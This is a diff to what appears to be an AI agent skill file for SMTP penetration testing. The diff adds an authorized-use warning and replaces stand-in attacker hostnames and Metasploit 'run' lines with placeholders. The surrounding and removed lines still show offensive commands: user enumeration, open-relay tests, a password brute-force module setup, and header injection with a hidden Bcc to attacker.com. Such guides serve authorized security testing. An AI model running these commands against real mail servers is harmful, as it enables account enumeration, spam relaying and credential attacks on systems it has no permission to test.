@@ -1,11 +1,14 @@
 ---
 name: smtp-penetration-testing
 description: "Conduct comprehensive security assessments of SMTP (Simple Mail Transfer Protocol) servers to identify vulnerabilities including open relays, user enumeration, weak authentication, and misconfiguration."
-risk: unknown
+risk: offensive
 source: community
 author: zebbern
 date_added: "2026-02-27"
 ---
+> [!WARNING]
+> **AUTHORIZED USE ONLY:** This skill contains offensive security techniques. You must have explicit, written permission from the system owner before executing any of these commands. Do not use this skill against targets you do not own or are not authorized to test.
+
 
 # SMTP Penetration Testing
 
@@ -124,7 +127,7 @@ Test available SMTP commands:
 nc TARGET_IP 25
 
 # Initial greeting
-EHLO attacker.com
+EHLO [SAFE-PAYLOAD]
 
 # Response shows capabilities:
 250-mail.target.com
@@ -151,7 +154,7 @@ EXPN staff
 250 2.1.5 user2@target.com
 
 # RCPT TO - Recipient verification
-MAIL FROM:<test@attacker.com>
+MAIL FROM:<test@[SAFE-PAYLOAD]>
 RCPT TO:<admin@target.com>
 # 250 OK = user exists
 # 550 = user doesn't exist
@@ -182,7 +185,7 @@ use auxiliary/scanner/smtp/smtp_enum
 set RHOSTS TARGET_IP
 set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
 set UNIXONLY true
-run
+# [SAFE-PAYLOAD] echo 'Simulating execution...'
 ```
 
 Using Nmap:
@@ -205,8 +208,8 @@ nmap -p 25 --script smtp-open-relay TARGET_IP
 
 # Manual testing via Telnet
 telnet TARGET_IP 25
-HELO attacker.com
-MAIL FROM:<test@attacker.com>
+HELO [SAFE-PAYLOAD]
+MAIL FROM:<test@[SAFE-PAYLOAD]>
 RCPT TO:<victim@external-domain.com>
 DATA
 Subject: Relay Test
@@ -222,7 +225,7 @@ Using Metasploit:
 ```bash
 use auxiliary/scanner/smtp/smtp_relay
 set RHOSTS TARGET_IP
-run
+# [SAFE-PAYLOAD] echo 'Simulating execution...'
 ```
 
 Test variations:
@@ -230,7 +233,7 @@ Test variations:
 ```bash
 # Test different sender/recipient combinations
 MAIL FROM:<>
-MAIL FROM:<test@[attacker_IP]>
+MAIL FROM:<test@[SAFE-PAYLOAD]>
 MAIL FROM:<test@target.com>
 
 RCPT TO:<test@external.com>
@@ -270,7 +273,7 @@ set RHOSTS TARGET_IP
 set USER_FILE /path/to/users.txt
 set PASS_FILE /path/to/passwords.txt
 set VERBOSE true
-run
+# [SAFE-PAYLOAD] echo 'Simulating execution...'
 ```
 
 ### Phase 8: SMTP Command Injection
@@ -279,11 +282,11 @@ Test for command injection vulnerabilities:
 
 ```bash
 # Header injection test
-MAIL FROM:<attacker@test.com>
+MAIL FROM:<[SAFE-PAYLOAD]@test.com>
 RCPT TO:<victim@target.com>
 DATA
 Subject: Test
-Bcc: hidden@attacker.com
+Bcc: hidden@[SAFE-PAYLOAD]
 X-Injected: malicious-header
 
 Injected content
@@ -447,7 +450,7 @@ msfconsole
 use auxiliary/scanner/smtp/smtp_enum
 set RHOSTS 192.168.1.100
 set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
-run
+# [SAFE-PAYLOAD] echo 'Simulating execution...'
 
 # Results show valid users
 [+] 192.168.1.100:25 - Found user: admin
@@ -462,13 +465,13 @@ run
 ```bash
 # Test via Telnet
 telnet mail.target.com 25
-HELO attacker.com
-MAIL FROM:<test@attacker.com>
+HELO [SAFE-PAYLOAD]
+MAIL FROM:<test@[SAFE-PAYLOAD]>
 RCPT TO:<test@gmail.com>
 # If 250 OK - VULNERABLE
 
 # Document with Nmap
-nmap -p 25 --script smtp-open-relay --script-args smtp-open-relay.from=test@attacker.com,smtp-open-relay.to=test@external.com mail.target.com
+nmap -p 25 --script smtp-open-relay --script-args smtp-open-relay.from=test@[SAFE-PAYLOAD],smtp-open-relay.to=test@external.com mail.target.com
 
 # Output:
 # PORT   STATE SERVICE
